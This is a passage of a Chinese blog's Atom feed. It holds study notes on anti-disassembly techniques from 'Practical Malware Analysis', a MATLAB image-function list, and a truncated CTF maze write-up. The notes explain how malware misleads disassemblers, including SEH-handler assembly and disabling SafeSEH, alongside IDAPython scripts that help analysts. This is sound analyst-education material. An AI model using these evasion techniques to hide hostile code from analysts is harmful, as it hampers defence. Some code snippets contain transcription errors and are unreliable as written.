    <content type="html"><![CDATA[<h1 id="第15章-对抗反汇编"><a href="#第15章-对抗反汇编" class="headerlink" title="第15章  对抗反汇编"></a>第15章  对抗反汇编</h1><h2 id="1-何谓对抗反汇编技术"><a href="#1-何谓对抗反汇编技术" class="headerlink" title="1. 何谓对抗反汇编技术"></a>1. 何谓对抗反汇编技术</h2><p>实现对抗反汇编时，恶意代码编写者会创建一段代码序列，欺骗反汇编器，让反汇编器展示与真正执行的代码不同的指令列表。</p><h2 id="2-挫败反汇编算法"><a href="#2-挫败反汇编算法" class="headerlink" title="2. 挫败反汇编算法"></a>2. 挫败反汇编算法</h2><p>对抗反汇编技术是基于反汇编算法的天生漏洞而产生的。为了清晰地显示反汇编代码，反汇编器在事前都会做某种特定的假设。一旦这种假设不成立，恶意代码作者就有机会欺骗分析人员。</p><p>反汇编算法可以分为两种：线性反汇编算法和面向代码流的反汇编算法。其中线性反汇编算法容易实现，但也易出错。</p><h3 id="线性反汇编"><a href="#线性反汇编" class="headerlink" title="线性反汇编"></a>线性反汇编</h3><p>线性反汇编策略是遍历一个代码段,一次一条指令的线性反汇编,从不偏离。反汇编器使用的这个基本策略已经被反汇编写作教程采用,并且被调试器广泛使用。线性反汇编用已经反汇编的指!令大小来决定下一个要反汇编的字节,而不考虑代码流的控制指令</p><blockquote><p>利用反汇编库libdisasm，C实现基于线性反汇编算法的反汇编器</p></blockquote><p><a href="https://i.loli.net/2018/10/18/5bc8774662859.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/10/18/5bc8774662859.jpg" class="lazyload"></a></p><p>本例中,名为 buffer的数据缓冲区包含需要反汇编的指令。函数x86 disasm将会用刚刚反汇编过的具体指令填充一个数据结构,然后返回这个指令的大小。如果反汇编是一条合法指令,这个循环会用size值递增 position变量(如1所示),否则递增1(如2所示)</p><p>这个代码片段中的许多指令拥有多个字节,恶意代码编写者利用线性反汇编算法的关键方法是植入能够组成多字节指令机器码的数据字节。例如,标准的本地ca11指令有5个字节,以机器码0xE8开头。如果16字节数据组成一个以值0xE8结尾的开关表,那么当反汇编器碰到Call指令的机器码时会将接下来的4个字节当作操作数对待,而不是当作下一个函数的开头。</p><p>线性反汇编算法不能区分代码与数据,因此最容易被恶意代码挫败。</p><h3 id="面向代码流的反汇编"><a href="#面向代码流的反汇编" class="headerlink" title="面向代码流的反汇编"></a>面向代码流的反汇编</h3><p>面向代码流的反汇编与线性反汇编的主要不同在于，面向代码流的反汇编器并不盲目地反汇编整个缓冲区，也不假设代码段中仅包含指令而不包含数据。相反，它会检查每一条指令，然后建立一个需要反汇编的地址列表。</p><p>如果IDAPro产生了不正确的反汇编代码，你可以利用键盘上的C键或D键，手动将指令转换成数据或者将数据转换成指令。步骤如下：</p><ol><li>按C键可以将光标位置的数据转换成代码。</li><li>按D键可以将光标位置的代码转换成数据。</li></ol><h2 id="3-对抗反汇编技术"><a href="#3-对抗反汇编技术" class="headerlink" title="3. 对抗反汇编技术"></a>3. 对抗反汇编技术</h2><p>恶意代码最常见的对抗反汇编技术的主要方法是利用反汇编器选择算法和假设算法的漏洞，使反汇编器产生错误的反汇编代码。</p><h3 id="相同目标的跳转指令"><a href="#相同目标的跳转指令" class="headerlink" title="相同目标的跳转指令"></a>相同目标的跳转指令</h3><p>恶意代码中最常见的对抗反汇编技术是使用指向同一目的地址的两个连续条件跳转指令。</p><p>如果jz1oc_512指令之后是jnz loc_512，则总是跳转到loc_512。jz指令与jnz指令的结合，在效果上等于无条件跳转指令jmp，因为反汇编器每次只反汇编一条指令，所以并不会意识到这种情况。当反汇编器遇到jnz指令时，依然会反汇编这个指令的false分支，尽管事实上这个分支永远不会执行。</p><h3 id="固定条件的跳转指令"><a href="#固定条件的跳转指令" class="headerlink" title="固定条件的跳转指令"></a>固定条件的跳转指令</h3><p>在恶意代码中，另一种常见的对抗反汇编技术是由跳转条件总是相同的一条跳转指令构成的。</p><p><a href="https://i.loli.net/2018/11/22/5bf6910ff2758.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/11/22/5bf6910ff2758.jpg" class="lazyload"></a></p><p>注意这段代码以xor eax，eax指令开头，这条指令的作用是将EAX寄存器置0，与此同时它也会设置标志寄存器的zero标志。下一条指令是条件跳转指令，如果标志寄存器zero标志被置位，它就会执行跳转。事实上，这根本不是条件跳转，因为在程序的这个位置，我们可以保证zero标志总是被置位的。</p><blockquote><p>xor指令与相邻jz指令的永假关系</p></blockquote><p><a href="https://i.loli.net/2018/11/22/5bf6917871865.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/11/22/5bf6917871865.jpg" class="lazyload"></a></p><h3 id="无效的反汇编指令"><a href="#无效的反汇编指令" class="headerlink" title="无效的反汇编指令"></a>无效的反汇编指令</h3><p>前面讨论的简单的对抗反汇编技术是巧妙地在条件跳转指令之后放一个字节，这种技术的思路是，从这个字节开始反汇编，阻止其后真正的指令被反汇编，因为插入的字节是一个多字节指令的机器码。我们称这样的字节为流氓字节，因为它不属于程序的一部分，只是用在代码段迷感反汇编器。</p><p>但是，如果流氓字节不能被忽略，如果它是合法指令的一部分，且在运行时能够被正确执行怎么办？这里，我们碰到一个棘手的问题，所有给定字节都是多字节指令的一部分，而且它们都能够被执行。目前业内没有一个反汇编器能够将单个字节表示为两条指令的组成部分，然而处理器并没有这种限制。</p><blockquote><p>内部跳转的jmp指令</p></blockquote><p><a href="https://i.loli.net/2018/11/22/5bf69651b711b.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/11/22/5bf69651b711b.jpg" class="lazyload"></a></p><p>当试图表达这个反汇编序列时，会十分困惑，因为如果将字节FF作为jmp指令的一部分，那么就不能作为inc eax指令的开头来进行显示。字节FF同时作为两条实际运行指令的一部分，而现代反汇编器并没有办法表达这种情况。这4个字节序列首先递增EAX，然后递减EAX。实际上，这是一个复杂的NOP序列，几乎可以插入程序的任何位置，从而破坏有效的反汇编链。为了解决这个问题，恶意代码分析人员常使用IDC或者IDAPython脚本，调用PatchByte函数，用NOP指令序列替换这个字节序列，另一种办法是使用D键将这样的字符序列全部转换成数据，让这4个字节之后的反汇编恢复正常。</p><blockquote><p>多层内部调转序列</p></blockquote><p><a href="https://i.loli.net/2018/11/22/5bf697244514f.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/11/22/5bf697244514f.jpg" class="lazyload"></a></p><p>在字节序列中，第一条指令是4字节的mov指令，其最后2个字节被高亮显示，因为它既是mov指令的一部分，同时也作为随后运行的一条指令。第一条指令会用数据填充AX寄存器。第二条指令xor会归零这个寄存器，且将标志寄存器zero置0。第三条指令是一个条件跳转指令，当标志寄存器zero标志置位时，它执行跳转。实际上它不是一个条件跳转，因为它的前一条指令总是设置zero标志。反汇编器会反汇编紧跟jz的指令，该指令以字节0xE8开头，0xE8是一个5字节call指令的机器码。然而这条以0xE8开头的指令实际上永远不会执行。</p><p>在这种情况下，反汇编器不能正确反汇编jz指令目标，因为这个字节已经被正确表达为mov指令的一部分。jz指令指向的代码总会被执行，因为jz指令运行时，zero标志总是被置位。指令z跳转到4字节的mov指令中间。mov指令的最后两个字节是存放在寄存器中的操作数。当单独反汇编或者运行这个操作数时，它又会组成一个jmp指令，这条jmp指令会从指令末尾向前跳转5个字节。</p><blockquote><p>IDAPython将字节换成NOP</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NopBytes</span><span class="params">(start,length)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">    PatchByte(start+i, <span class="number">0x90</span>)</span><br><span class="line">MakeCode(start)</span><br><span class="line">NopBytes(起始地址,长度)</span><br></pre></td></tr></table></figure></div><h3 id="用IDA-PRO对指令进行NOP替换"><a href="#用IDA-PRO对指令进行NOP替换" class="headerlink" title="用IDA PRO对指令进行NOP替换"></a>用IDA PRO对指令进行NOP替换</h3><p>如下脚本的作用是创建一个热键ALT+N，一旦脚本运行，无论用户何时按下ALT+N组合键，IDAPro都会使用NOP指令替换当前光标位置处的字节。它也能简单地将光标移到下一条指令处，从而使替换大块代码变得更容易。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line">idaapi.Compileline(<span class="string">'static n_key()&#123; RunPythonStatement("nopIt()");&#125;'</span>)</span><br><span class="line"></span><br><span class="line">AddHotkey(<span class="string">"Alt-N"</span>,<span class="string">"n_key"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nopIt</span><span class="params">()</span>:</span></span><br><span class="line">    start=ScreenEA()</span><br><span class="line">    end=NextHead(start)</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> range(start, end): PatchByte(ea,<span class="number">0x90</span>)</span><br><span class="line">    Jump(end) Refresh()</span><br></pre></td></tr></table></figure></div><h2 id="4-混淆控制流图"><a href="#4-混淆控制流图" class="headerlink" title="4. 混淆控制流图"></a>4. 混淆控制流图</h2><h3 id="函数指针问题"><a href="#函数指针问题" class="headerlink" title="函数指针问题"></a>函数指针问题</h3><p>在C语言程序中刻意使用函数指针，这可以大大降低反汇编器自动推导出程序流的信息量。如果在汇编语言中刻意使用函数指针或者在源码中构造不标准的函数指针格式，会导致在没有动态分析的前提下很难进行逆向工程。</p><h3 id="在IDA-Pro中添加代码的交叉引用"><a href="#在IDA-Pro中添加代码的交叉引用" class="headerlink" title="在IDA Pro中添加代码的交叉引用"></a>在IDA Pro中添加代码的交叉引用</h3><p>使用IDC中名为AddCodeXref的函数。它有三个参数：交叉引用来源的位置、交叉引用指向的位置，以及流的类型。这个函数可以支持多个不同的流类型，但最常用的是普通call指令类型fl_CF，或是跳转指令的类型fl_JF。</p><h3 id="滥用返回指针"><a href="#滥用返回指针" class="headerlink" title="滥用返回指针"></a>滥用返回指针</h3><p>在程序中，call指令和jmp指令并不是唯一转换控制流的指令。与call指令对应的指令是retn（也被表示为ret）。call指令与jmp指令功能类似，不同的是它将函数返回地址压入到栈中，返回点是紧随call指令的一个内存地址。</p><p>call指令等同于jmp指令加push指令，retn指令等同于jmp指令加pop指令。retn指令首先从栈顶弹出一个值（返回值地址），然后跳转到这个值所表示的地址处。retn通常被用来返回一个函数调用，但由于体系结构的限制，它不能用于一般的执行控制流。</p><p>当retn指令不以函数调用返回的方式被使用时，这种技术的最显著结果是反汇编器不能显示代码中任何要跳转的交又引用目标。另一个显著的结果是反汇编器会提前结束这个函数。</p><h3 id="滥用结构化异常处理"><a href="#滥用结构化异常处理" class="headerlink" title="滥用结构化异常处理"></a>滥用结构化异常处理</h3><p>结构化异常处理（SEH）提供一种控制流的方法，该方法不能被反汇编器采用，但可以用来欺骗反汇编器。SEH是×86体系结构的一种功能，旨在为程序提供一种智能处理错误条件的方法。编程语言例如C++，Ada等，严重依赖异常处理，并且在x86系统上编译时会自动翻译成SEH。</p><p>异常触发可能有多种原因，例如访问一个无效内存区域、除零等。也可以调用函数RaiseException产生额外的软件异常。</p><p>SEH链是一个函数列表，设计它的目的是处理线程中的异常。列表中的每个函数，要么处理异常，要么将异常传递到列表中的下一个函数。如果一个异常总是被传递到最后一个异常处理函数处，就会被认为是一个不能处理的异常。这种情况下，最后一个异常处理函数会负责弹出一个熟悉的消息对话框，通知用户“an unhandled exception has occurred”。在大多数进程中，异常是有规律地产生的，但在到达最后状态（使程序崩溃并通知用户）之前，异常都会被静悄悄的处理。</p><p>为了查找SEH链，操作系统会检查FS段寄存器。这个寄存器包含一个段选择子，使用段选择子可以得到线程环境块（TEB）。TEB中第一个数据结构是线程信息块（TIB）。TIB中的第一个元素（即TIB的第一个字节）就是SEH链的指针。SEH链是一个简单的8字节数据结构链表，这个8字节数据结构叫作EXCEPTION_REGISTRATION记录。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct_EXCEPTION_RECISTRATION&#123;</span><br><span class="line">    DWORD prev；</span><br><span class="line">DWORD handler；</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure></div><p>EXCEPTION_REGISTRATION记录的第一个元素是一个指向前一个记录的指针。第二个元素则是一个指向异常处理函数的指针。</p><p>从概念上讲，这个链表以栈的方式进行操作。第一个调用的是最后一个加入链表的记录。由于子进程的调用与嵌套的异常处理块的原因，SEH链的增长和缩小等同于程序中异常处理层的改变，所以SEH记录总是建在栈上。</p><p>利用SEH实现变相控制程序流，并不需要在意当前异常处理链有多少个记录，只需要了解怎么将自己的异常处理添加到链表的头部</p><p><a href="https://i.loli.net/2018/11/22/5bf69c4ebab61.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/11/22/5bf69c4ebab61.jpg" class="lazyload"></a>。</p><p>为了将一条记录添加到这个链中，我们需要在栈上构造一条新记录。因为记录结构由两个DWORD变量组成，所以使用两个push指令来完成。栈是向上增长的，所以第一个push进栈的是异常处理函数指针，第二个push进栈的是下一条记录的指针。当添加一条记录到链表的头部时，下一条记录需要完成的异常处理是当前的栈项，它由fs[e]指针给出。下面是实现这一功能的代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ExceptionHandler </span><br><span class="line">push fs:[0]</span><br><span class="line">mov fs:[0]，esp</span><br></pre></td></tr></table></figure></div><p>异常发生时，将首先调用函数ExceptionHandler。这个动作会受到微软的软件数据执行保护机制（软件DEP，也被称为SafeSEH）的限制。</p><p>软件DEP是一项安全功能，它的目的是阻止程序运行过程中添加第三方的异常处理。对于硬编码的代码，有几种方法能够绕过这种技术，例如使用支持SafeSEH指令的汇编器。另外，使用微软的C编译器也能达到此目的，添加/SAFESEH:NO到链接器命令行，就可使这种限制无效。</p><p>当调用ExceptionHandler函数时，栈将被大幅改变。幸运的是，要达到我们的目的，没必要检查添加到栈中的所有数据。我们必须知道怎么返回异常发生前的栈位置。回想一下，我们的目的是混淆控制流且使程序不能正确处理异常。</p><p>当异常处理被调用时，操作系统添加了其他的SEH处理。为了让程序恢复正常操作，不仅要将我们的异常处理从异常处理链中断开，还要将系统添加的异常处理从异常处理链中断开。因此，我们需要从esp+8处而不是esp处取出原始的栈指针。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp，[esp+8]</span><br><span class="line">mov eax，fs:[0]</span><br><span class="line">mov eax，[eax]mov eax，[eax]</span><br><span class="line">mov fs:[0]，eax add esp，8</span><br></pre></td></tr></table></figure></div><h3 id="5-挫败栈帧分析"><a href="#5-挫败栈帧分析" class="headerlink" title="5. 挫败栈帧分析"></a>5. 挫败栈帧分析</h3><p>为了解决栈帧的轻微调整（用栈帧分析的固有易犯错特性偶尔会导致这种情况发生），在IDA Pro中，将光标放到某个特定反汇编行上，然后通过按ALT+K组合键，输入调整的栈指针值。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第15章-对抗反汇编&quot;&gt;&lt;a href=&quot;#第15章-对抗反汇编&quot; class=&quot;headerlink&quot; title=&quot;第15章  对抗反汇编&quot;&gt;&lt;/a&gt;第15章  对抗反汇编&lt;/h1&gt;&lt;h2 id=&quot;1-何谓对抗反汇编技术&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第五篇 逆向工程" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E7%AF%87-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>MATLAB图像处理常用函数</title>
    <link href="https://kabeor.github.io/MATLAB%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>https://kabeor.github.io/MATLAB%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</id>
    <published>2019-01-27T16:00:00.000Z</published>
    <updated>2020-05-03T04:41:24.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MATLAB图像处理常用函数"><a href="#MATLAB图像处理常用函数" class="headerlink" title="MATLAB图像处理常用函数"></a>MATLAB图像处理常用函数</h1><p>期末考完一直在忙着写机器学习图像识别的项目，简单记录一下</p><h2 id="数字图像的读取"><a href="#数字图像的读取" class="headerlink" title="数字图像的读取"></a>数字图像的读取</h2><blockquote><p>imread</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imread( ‘filename’ );</span><br><span class="line">其中，filename是一个含有图像文件全名的字符串,包括文件的扩展名。单引号‘’来界定filename字符串。结尾处用分号在MATLAB中用于取消输出。</span><br><span class="line"></span><br><span class="line">size(I);</span><br><span class="line">函数size可以给出图像的行数和列数。如果size前面没有变量，则存在ans变量里。如果有变量，比如[M，N]&#x3D;size(I);则该命令将返回函数的行数M和列数N。</span><br></pre></td></tr></table></figure></div><h2 id="数字图像显示"><a href="#数字图像显示" class="headerlink" title="数字图像显示"></a>数字图像显示</h2><blockquote><p>imshow(I, G)</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G是显示该图像的灰度级数，若将G省略，则默认的灰度级数为256</span><br></pre></td></tr></table></figure></div><blockquote><p>imshow(I, [low high])</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">会将所有小于或等于low的值都显示为黑色，所有大于或等于high的值都显示为白色。界于low和high之间的值将以默认的级数显示为中等亮度值。</span><br></pre></td></tr></table></figure></div><blockquote><p>imshow(I,[])</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将变量low设置为数组f的最小值，将变量high设置为数组f的最大值。该函数用来显示动态范围较小的图像时非常有用。</span><br></pre></td></tr></table></figure></div><h2 id="图像保存"><a href="#图像保存" class="headerlink" title="图像保存"></a>图像保存</h2><blockquote><p>imwrite(f, ’filename’)</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">该函数的功能是使用函数imwrite可以将图像写到磁盘上的filename命令的文件中。Filename必须包含文件的扩展名。</span><br></pre></td></tr></table></figure></div><h2 id="图像类型转换"><a href="#图像类型转换" class="headerlink" title="图像类型转换"></a>图像类型转换</h2><blockquote><p>G=im2bw(I,T)</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">该函数的功能就是将亮度图像I转换为一幅二值图像G。在亮度图像中，亮度值小于T的像素点全部转换为二值图像中值为0的像素点；在亮度图像中，亮度值大于T的像素点全部转换为二值图像中值为1的像素点。</span><br></pre></td></tr></table></figure></div><blockquote><p>G=rgb2gray(I)<br><code>该函数将彩色图像数组I转换为灰度图像G。</code></p></blockquote><h2 id="图像的几何操作"><a href="#图像的几何操作" class="headerlink" title="图像的几何操作"></a>图像的几何操作</h2><blockquote><p>imread 加<br>imsubtract 减</p></blockquote><blockquote><p>imresize 缩放</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imresize(A,scale,method)</span><br><span class="line">imresize(A,[mrows ncols],method)</span><br><span class="line">method</span><br><span class="line">Nearest:最近邻插值</span><br><span class="line">Bilinear:双线性插值</span><br><span class="line">Bicubic:双三次插值，系统默认值</span><br></pre></td></tr></table></figure></div><blockquote><p>imrotate(A,angle,method) 旋转<br>逆时针为正，顺时针为负。</p></blockquote><h2 id="亮度变换"><a href="#亮度变换" class="headerlink" title="亮度变换"></a>亮度变换</h2><blockquote><p>imadjust</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g&#x3D;imadjust(f,[low_in high_in],[low_out high_out], gamma)</span><br><span class="line"></span><br><span class="line">将图像f中的亮度值映像到g中的新值，即将low_in至high_in之间的值映射到low_out至high_out之间的值。</span><br><span class="line">low_in以下的值映射为low_out, high_in以上的值映射为high_out.</span><br></pre></td></tr></table></figure></div><h2 id="图像直方图函数"><a href="#图像直方图函数" class="headerlink" title="图像直方图函数"></a>图像直方图函数</h2><blockquote><p>imhist</p></blockquote><h2 id="滤波函数"><a href="#滤波函数" class="headerlink" title="滤波函数"></a>滤波函数</h2><blockquote><p>线性空间滤波函数</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B&#x3D;imfilter(A,H)</span><br><span class="line">A是输入图像，B是滤波后的输出图像，H是滤波模板</span><br><span class="line"></span><br><span class="line">imfilter(I,fspecial(&#39;average&#39;,[3 3]));</span><br></pre></td></tr></table></figure></div><blockquote><p>高斯滤波</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imfilter(I,fspecial(&#39;gaussian&#39;,[3 3]));</span><br></pre></td></tr></table></figure></div><blockquote><p>中值滤波</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medfilt2(I,[3,3]);</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;MATLAB图像处理常用函数&quot;&gt;&lt;a href=&quot;#MATLAB图像处理常用函数&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
    <category term="MATLAB" scheme="https://kabeor.github.io/tags/MATLAB/"/>
    
    <category term="图像处理" scheme="https://kabeor.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>SUS十一欢乐赛 re200 maze</title>
    <link href="https://kabeor.github.io/SUS%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B%20re200%20maze/"/>
    <id>https://kabeor.github.io/SUS%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B%20re200%20maze/</id>
    <published>2018-10-06T16:00:00.000Z</published>
    <updated>2020-03-16T04:50:06.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUS十一欢乐赛-re200-maze"><a href="#SUS十一欢乐赛-re200-maze" class="headerlink" title="SUS十一欢乐赛 re200 maze"></a>SUS十一欢乐赛 re200 maze</h1><p><a href="https://i.loli.net/2018/10/07/5bb9757376a67.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/10/07/5bb9757376a67.jpg" class="lazyload"></a></p><p>x64的ELF，载入IDA64</p><p>题目已经告诉是迷宫了，搜索一下字符串</p><p><a href="https://i.loli.net/2018/10/07/5bb9764bbf2b6.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/10/07/5bb9764bbf2b6.jpg" class="lazyload"></a></p><p>看到map<br><code>oooo*oooooxxxxoxxooxooooxoooxxoxxxooooxxxooxooooxooxxooooxxxoxooooxoxxxxoooooooox</code></p><p>但目前不知道map规格，于是跟随SUSCTF{字符跳转，F5</p><p><a href="https://i.loli.net/2018/10/07/5bb977240df3c.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/10/07/5bb977240df3c.jpg" class="lazyload"></a></p><p>很明显第18行检查输入长度是否为18<br><code>if (std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(&amp;v12) != 18 )</code></p><p>下面是方向控制 awsd</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 17; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; *(char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](&amp;v12, i);</span><br><span class="line">    if ( v5 &#x3D;&#x3D; &#39;d&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &gt; &#39;d&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 &#x3D;&#x3D; &#39;s&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 +&#x3D; 9;</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v5 &#x3D;&#x3D; &#39;w&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 -&#x3D; 9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 &#x3D;&#x3D; &#39;a&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      --v10;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>由上下换行加减9可以判断出，<strong>map每行9个字符</strong>，于是得到map</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oooo*oooo</span><br><span class="line">oxxxxoxxo</span><br><span class="line">oxooooxoo</span><br><span class="line">oxxoxxxoo</span><br><span class="line">ooxxxooxo</span><br><span class="line">oooxooxxo</span><br><span class="line">oooxxxoxo</span><br><span class="line">oooxoxxxx</span><br><span class="line">oooooooox</span><br></pre></td></tr></table></figure></div><p>判定边界o</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span 